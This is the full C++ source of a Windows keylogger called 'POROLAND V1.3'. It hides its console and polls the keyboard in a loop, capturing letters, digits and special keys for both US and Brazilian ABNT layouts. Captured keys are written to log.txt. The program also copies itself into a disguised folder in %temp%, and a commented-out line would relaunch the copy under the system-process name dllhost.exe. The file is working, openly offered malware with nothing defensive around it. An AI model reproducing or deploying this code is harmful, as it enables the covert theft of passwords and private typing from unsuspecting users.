//-----------------------------------------------------
//
//                 POROLAND V1.3
//
//-----------------------------------------------------
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;
ofstream arq;

bool firstTime(char *argv[]);
void arqLog(string keys);

int main(int argc, char *argv[]){

    FreeConsole(); // Hide console
    string keys;

    if(firstTime(argv)==1)
    while(1){
        if(GetAsyncKeyState(0x30)||GetAsyncKeyState(0x60)){keys+="0";arqLog(keys);}
        if(GetAsyncKeyState(0x31)||GetAsyncKeyState(0x61)){keys+="1";arqLog(keys);}
        if(GetAsyncKeyState(0x32)||GetAsyncKeyState(0x62)){keys+="2";arqLog(keys);}
        if(GetAsyncKeyState(0x33)||GetAsyncKeyState(0x63)){keys+="3";arqLog(keys);}
        if(GetAsyncKeyState(0x34)||GetAsyncKeyState(0x64)){keys+="4";arqLog(keys);}
        if(GetAsyncKeyState(0x35)||GetAsyncKeyState(0x65)){keys+="5";arqLog(keys);}
        if(GetAsyncKeyState(0x36)||GetAsyncKeyState(0x66)){keys+="6";arqLog(keys);}
        if(GetAsyncKeyState(0x37)||GetAsyncKeyState(0x67)){keys+="7";arqLog(keys);}
        if(GetAsyncKeyState(0x38)||GetAsyncKeyState(0x68)){keys+="8";arqLog(keys);}
        if(GetAsyncKeyState(0x39)||GetAsyncKeyState(0x69)){keys+="9";arqLog(keys);}

        if(GetAsyncKeyState(0x41)){keys+="a";arqLog(keys);}
        if(GetAsyncKeyState(0x42)){keys+="b";arqLog(keys);}
        if(GetAsyncKeyState(0x43)){keys+="c";arqLog(keys);}
        if(GetAsyncKeyState(0x44)){keys+="d";arqLog(keys);}
        if(GetAsyncKeyState(0x45)){keys+="e";arqLog(keys);}
        if(GetAsyncKeyState(0x46)){keys+="f";arqLog(keys);}
        if(GetAsyncKeyState(0x47)){keys+="g";arqLog(keys);}
        if(GetAsyncKeyState(0x48)){keys+="h";arqLog(keys);}
        if(GetAsyncKeyState(0x49)){keys+="i";arqLog(keys);}
        if(GetAsyncKeyState(0x4A)){keys+="j";arqLog(keys);}
        if(GetAsyncKeyState(0x4B)){keys+="k";arqLog(keys);}
        if(GetAsyncKeyState(0x4C)){keys+="l";arqLog(keys);}
        if(GetAsyncKeyState(0x4D)){keys+="m";arqLog(keys);}
        if(GetAsyncKeyState(0x4E)){keys+="n";arqLog(keys);}
        if(GetAsyncKeyState(0x4F)){keys+="o";arqLog(keys);}
        if(GetAsyncKeyState(0x50)){keys+="p";arqLog(keys);}
        if(GetAsyncKeyState(0x51)){keys+="q";arqLog(keys);}
        if(GetAsyncKeyState(0x52)){keys+="r";arqLog(keys);}
        if(GetAsyncKeyState(0x53)){keys+="s";arqLog(keys);}
        if(GetAsyncKeyState(0x54)){keys+="t";arqLog(keys);}
        if(GetAsyncKeyState(0x55)){keys+="u";arqLog(keys);}
        if(GetAsyncKeyState(0x56)){keys+="v";arqLog(keys);}
        if(GetAsyncKeyState(0x57)){keys+="w";arqLog(keys);}
        if(GetAsyncKeyState(0x58)){keys+="x";arqLog(keys);}
        if(GetAsyncKeyState(0x59)){keys+="y";arqLog(keys);}
        if(GetAsyncKeyState(0x5A)){keys+="z";arqLog(keys);}

        /* //FOR US KEYBOARD
        if(GetAsyncKeyState(0x6A)){keys+="*";arqLog(keys);}
        if(GetAsyncKeyState(0x20)){keys+=" ";arqLog(keys);}
        if(GetAsyncKeyState(0x0D)){keys+=" | ";arqLog(keys);}
        if(GetAsyncKeyState(0xBA)){keys+=";(or:)";arqLog(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";arqLog(keys);}
        if(GetAsyncKeyState(0xBC)){keys+=",(or<)";arqLog(keys);}
        if(GetAsyncKeyState(0xBE)){keys+=".(or>)";arqLog(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";arqLog(keys);}
        if(GetAsyncKeyState(0xBF)){keys+="/(or?)";arqLog(keys);}
        if(GetAsyncKeyState(0xC0)){keys+="`(or~)";arqLog(keys);}
        if(GetAsyncKeyState(0xDB)){keys+="´(or`)";arqLog(keys);}
        if(GetAsyncKeyState(0xDC)){keys+="\(or|)";arqLog(keys);}
        if(GetAsyncKeyState(0xDD)){keys+="](or})";arqLog(keys);}
        if(GetAsyncKeyState(0xDE)){keys+="'(or\")";arqLog(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";arqLog(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";arqLog(keys);}
        if(GetAsyncKeyState(0x14)){keys+="[CAPS]";arqLog(keys);}
        if(GetAsyncKeyState(0x08)){keys+="[BACKSPACE]";arqLog(keys);}
        if(GetAsyncKeyState(0x09)){keys+="[TAB]";arqLog(keys);}
        if(GetAsyncKeyState(0xA0)||GetAsyncKeyState(0xA1)){keys+="[SHIFT]";arqLog(keys);}*/

        // FOR ABNT KEYBOARD
        if(GetAsyncKeyState(0x6A)){keys+="*";arqLog(keys);}
        if(GetAsyncKeyState(0x20)){keys+=" ";arqLog(keys);}
        if(GetAsyncKeyState(0x0D)){keys+=" | ";arqLog(keys);}
        if(GetAsyncKeyState(0xBA)){keys+="c(decilha)";arqLog(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";arqLog(keys);}
        if(GetAsyncKeyState(0xBC)){keys+=",(or<)";arqLog(keys);}
        if(GetAsyncKeyState(0xBE)){keys+=".(or>)";arqLog(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";arqLog(keys);}
        if(GetAsyncKeyState(0xBF)){keys+=";(or:)";arqLog(keys);}
        if(GetAsyncKeyState(0xC0)){keys+="'(or\")";arqLog(keys);}
        if(GetAsyncKeyState(0xC1)){keys+="/(or?)";arqLog(keys);}
        if(GetAsyncKeyState(0xDB)){keys+="´(or`)";arqLog(keys);}
        if(GetAsyncKeyState(0xDC)){keys+="](or})";arqLog(keys);}
        if(GetAsyncKeyState(0xDD)){keys+="[(or{)";arqLog(keys);}
        if(GetAsyncKeyState(0xDE)){keys+="~(or^)";arqLog(keys);}
        if(GetAsyncKeyState(0xBD)){keys+="-(or_)";arqLog(keys);}
        if(GetAsyncKeyState(0xBB)){keys+="=(or+or§)";arqLog(keys);}
        if(GetAsyncKeyState(0x14)){keys+="[CAPS]";arqLog(keys);}
        if(GetAsyncKeyState(0x08)){keys+="[BACKSPACE]";arqLog(keys);}
        if(GetAsyncKeyState(0x09)){keys+="[TAB]";arqLog(keys);}
        if(GetAsyncKeyState(0xA0)||GetAsyncKeyState(0xA1)){keys+="[SHIFT]";arqLog(keys);}

        Sleep(150);
    }
    return 0;
}

bool firstTime(char *argv[]){
    if(strncmp(argv[0],"C:\\", 3)!=0){
        char path[100];
        sprintf( path, "copy /y \"%s\" \"%%temp%%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\" ", argv[0]);
        system("mkdir %temp%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\\");
        system(path);
        //system("start %temp%\\237Y6B11-98AH-4A7D-AEF7-P045A1CA2Z6N\\dllhost.exe");
        return 0;
    }
    return 1;
}

void arqLog(string keys){
    arq.open ("log.txt");
    arq << keys;
    arq.close();
}
